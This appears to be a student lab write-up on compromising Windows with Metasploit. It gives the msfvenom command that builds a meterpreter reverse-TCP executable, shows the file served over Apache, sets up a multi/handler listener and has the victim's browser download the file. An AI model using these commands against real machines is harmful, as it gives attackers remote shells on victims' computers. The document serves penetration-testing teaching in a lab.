# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="1822" height="863" alt="be6c2aed-7b7b-4609-bdf0-56264b1ba52e" src="https://github.com/user-attachments/assets/f97f0ec0-f6c0-40b1-bcf4-1ffe747c2392" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="2170" height="725" alt="e104a1a7-d4ed-4205-b2e0-e1dcc29b227d" src="https://github.com/user-attachments/assets/c9270dfa-928e-47a0-8313-1b428867915b" />



copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="2170" height="725" alt="fb83dd2a-3e36-46a1-b28f-091dd7dce5a2" src="https://github.com/user-attachments/assets/8467a359-c667-4dfe-ade9-eaf16eb43a36" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="2170" height="725" alt="079c2da7-eee4-4177-9d50-709077f2af88" src="https://github.com/user-attachments/assets/2cba7b10-e119-43d8-9e13-ee80b7fbd79b" />



Invoke msfconsole:
## OUTPUT:

<img width="1418" height="1109" alt="cac0f130-8bbc-4928-abeb-1ce59f7a0d28" src="https://github.com/user-attachments/assets/1cd30c83-7737-44c7-855f-713b9fd5901c" />




Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 


## OUTPUT:

<img width="810" height="192" alt="image" src="https://github.com/user-attachments/assets/a41b73d7-7124-453c-b8e3-8a26d49440b5" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
